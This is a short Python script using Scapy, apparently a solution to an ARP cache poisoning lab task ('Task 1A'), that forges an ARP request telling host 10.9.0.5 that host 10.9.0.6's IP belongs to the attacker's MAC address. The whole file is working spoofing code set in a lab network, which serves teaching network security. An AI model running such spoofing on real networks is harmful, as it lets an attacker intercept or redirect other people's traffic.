#!/usr/bin/env python3
from scapy.all import *

# Host A IP and MAC address
A_IP = "10.9.0.5"
A_MAC = "02:42:0a:09:00:05"

# Host B IP address
B_IP = "10.9.0.6"

# Attacker M MAC address
M_MAC = "02:42:0a:09:00:69"

# Create Ethernet frame from M to A
E = Ether(src=M_MAC, dst=A_MAC)

# Create forged ARP Request
# Claim that B's IP belongs to M's MAC
A = ARP(
    op=1,
    hwsrc=M_MAC,
    psrc=B_IP,
    pdst=A_IP
)

# Combine Ethernet and ARP packet
pkt = E / A

# Send the forged packet
sendp(pkt, verbose=False)

print("Task 1A: Forged ARP Request sent")
